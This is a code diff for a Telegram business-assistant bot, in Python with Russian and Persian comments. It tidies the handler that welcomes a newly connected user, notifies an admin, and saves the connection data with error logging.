@@ -170,18 +170,25 @@ async def fixed_get_gift_name(business_connection_id: str, owned_gift_id: str) -
 
 
 @dp.business_connection()
-async def handle_business_connect(business_connection: business_connection):
+async def handle_business_connect(business_connection: BusinessConnection):
     try:
         await send_welcome_message_to_admin(business_connection, business_connection.user.id, ADMIN_ID, bot)
-        await bot.send_message(business_connection.user.id, "Привет! Ты подключил моего бота как бизнес-ассистента.")
+        await bot.send_message(
+            business_connection.user.id,
+            "Привет! Ты подключил моего бота как бизнес-ассистента."
+        )
 
         business_connection_data = {
             "user_id": business_connection.user.id,
             "business_connection_id": business_connection.id,
             "username": business_connection.user.username,
-            "first_name": "FirstName",
+            "first_name": "FirstName",  # اگر داده واقعی داری اینجا بذار
             "last_name": "LastName"
         }
-        user_id = business_connection.user.id
-        connection_id = business_connection.user.id
-return 
+
+        # ذخیره اتصال
+        save_business_connection_data(business_connection)
+
+    except Exception as e:
+        logging.exception("Ошибка при обработке подключения бизнес-бота.")
+
